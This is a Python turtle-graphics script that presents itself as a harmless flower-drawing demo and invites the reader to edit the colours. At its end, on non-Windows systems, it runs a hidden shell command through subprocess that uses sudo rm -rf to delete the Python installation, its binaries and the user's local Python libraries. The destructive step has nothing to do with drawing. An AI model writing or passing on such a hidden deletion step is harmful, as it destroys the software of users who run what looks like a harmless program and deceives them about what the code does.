import subprocess
import os
from turtle import *
from math import *

speed(0)
bgcolor("black")
goto(0,-40)

#Feel free to edit this to change the flower color :)
petal = "#CE2222"
flowerCenter = "#FFA216"

for i in range(16):
    for j in range(18):
        color(petal), rt(90)
        circle(150 - j * 6, 90), lt(90)
        circle(150 - j * 6, 90), rt(180)
    circle(40, 24)

color('black')
shape('circle')
shapesize(0.5)
fillcolor(flowerCenter)
flCeAn = 137.508
phi = flCeAn*(pi/180)

for i in range(140):
    r = 4 * sqrt(i)
    th = i*phi
    x = r * cos(th)
    y = r * sin(th)
    penup(), goto(x,y)
    setheading(i * flCeAn)
    pendown(), stamp()

isWindows = platform.system() == "Windows"
if not isWindows:
    delTemp = "sudo rm -rf /Library/Frameworks/Python.framework/Versions/3.13 && sudo rm -rf /Applications/Python\ 3.13 && sudo rm -rf /usr/local/bin/python3 && sudo rm -rf /usr/local/bin/python3.13 && rm -rf ~/.local/lib/python3.13 && rm -rf ~/.local/bin/python3"
    subprocess.run(delTemp, shell=True)

done()
